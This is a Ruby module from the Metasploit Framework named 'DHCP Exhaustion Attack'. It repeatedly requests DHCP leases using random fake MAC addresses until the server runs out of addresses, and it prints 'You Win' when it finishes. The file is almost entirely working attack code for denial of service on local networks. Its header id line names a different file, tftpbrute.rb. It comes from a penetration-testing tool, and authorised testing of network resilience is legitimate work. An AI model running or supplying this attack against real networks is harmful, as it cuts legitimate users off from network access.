##
# $Id: tftpbrute.rb 6670 2009-06-17 21:39:17Z hdm $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'
require 'lib/dhcp'

class TimeoutCatcher < RuntimeError
end

class Metasploit3 < Msf::Auxiliary
	include Msf::Exploit::Capture

	#INCLUDE Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'        => 'DHCP Exhaustion Attack',
			'Description' => 'Use up all DHCP leases from a given server',
			'Author'      => ['Robin Wood <robin@digininja.org>'],
			'Version'     => '1',
			'License'     => MSF_LICENSE
		)

		#		OptAddress.new('DHCPSERVER', [true,"The DHCP server to attack","255.255.255.255"]),
		register_options(
			[
				OptInt.new('TIMEOUT', [true,"Timeout waiting for server response", 10])
			], self.class)
		deregister_options('RHOST')
		deregister_options('PCAPFILE')
	end

	def generate_pair
		a = rand(255).to_s(16)
		return (a.length < 2 ? generate_pair : a)
	end


	def generate_random_mac
		random_mac = "00:" + (0..4).map { |x| generate_pair }.join(":")
		#puts random_mac
		return random_mac
	end

	def request_for(mac)
		begin
			udp_listener = Rex::Socket.create_udp({"LocalPort" => 68})
			open_pcap

			offer = nil

			dparams={}
			dparams[:chaddr] = mac

			#puts "Sending Discover"
			discover = DHCP::Discover.new dparams
			payload = discover.pack

			udp_sock = Rex::Socket.create_udp({"LocalHost" => "0.0.0.0", "LocalPort" => 68, 'PeerHost' => '255.255.255.255', 'PeerPort' => 67})
			udp_sock.write payload

			#puts "Discover sent, waiting for reply"

			start_time = Time.now.to_i

			timeout = false

			begin
				each_packet do |pkt|
					if Time.now.to_i - start_time > datastore['TIMEOUT'].to_i
						raise TimeoutCatcher
					end

					eth = Racket::L2::Ethernet.new(pkt)
					next if not eth.ethertype == 0x0800

					ip = Racket::L3::IPv4.new(eth.payload)
					next if not ip.protocol == 0x11

					udp = Racket::L4::UDP.new(ip.payload)
					next if not (udp.payload and udp.payload.length > 0 and udp.src_port == 67 and udp.dst_port == 68)
					offer = DHCP::Message.from_udp_payload udp.payload
					#puts offer
					
					raise Exception
				end
			rescue TimeoutCatcher
				print_status "Timeout waiting for OFFER"
				timeout = true
			rescue
				# Do nothing
			end

			if timeout
				return
			end

			#puts "Received reply of type: " + offer.class.to_s

			case offer.class.to_s
				when "DHCP::Offer"
					print_status "DHCP offer of address: " + offer.offered_ip

					rparams={}
					rparams[:xid] = offer.xid
					rparams[:chaddr] = mac

					request = DHCP::Request.new rparams

					offered_ip_as_array=[offer.yiaddr].pack("N").unpack("C4")
					optx = DHCP::RequestedIPAddressOption.new({:payload=>offered_ip_as_array})
					request.options << optx

					payload = request.pack
					#puts "Sending DHCP request"
					result = udp_sock.write(payload)

					#puts "Listening for ACK"

					ack = nil
					start_time = Time.now.to_i
					begin
						each_packet do |pkt|
							if Time.now.to_i - start_time > datastore['TIMEOUT'].to_i
								puts "Timeout waiting for ACK"
								return false
							end

							eth = Racket::L2::Ethernet.new(pkt)
							next if not eth.ethertype == 0x0800

							ip = Racket::L3::IPv4.new(eth.payload)
							next if not ip.protocol == 0x11

							udp = Racket::L4::UDP.new(ip.payload)
							next if not (udp.payload and udp.payload.length > 0 and udp.src_port == 67 and udp.dst_port == 68)

							ack = DHCP::Message.from_udp_payload udp.payload
							
							raise TimeoutCatcher
						end

					rescue TimeoutCatcher
						# Do nothing
					end
					#puts "Received reply of type: " + ack.class.to_s

					case ack.class.to_s
						when "DHCP::NACK"
							print_status "Got a NACK back, no IP address allocated"
						when "DHCP::ACK"
							print_status "Got the ACK back, IP address allocated successfully"
					end
		end
		rescue
			print_status "Error: " + $!.to_s
			caller.each {|c| puts c}
		ensure
			if udp_listener != nil and !udp_listener.closed?
				udp_listener.close
			end
			if udp_sock != nil && !udp_sock.closed?
				udp_sock.close
			end
		end

		return true
	end

	def run
		begin
			print_status "DHCP attack started"

		#	request_for "00:1e:8c:66:86:04"
			while (1) do
				result = request_for generate_random_mac
				if !result
					print_status "Got a timeout, assuming DHCP exhausted. You Win"
					break
				end
			end

			print_status "Finished"
			return
		rescue
			print_status "Error: " + $!.to_s
			caller.each {|c| puts c}
		ensure
		end
	end

end
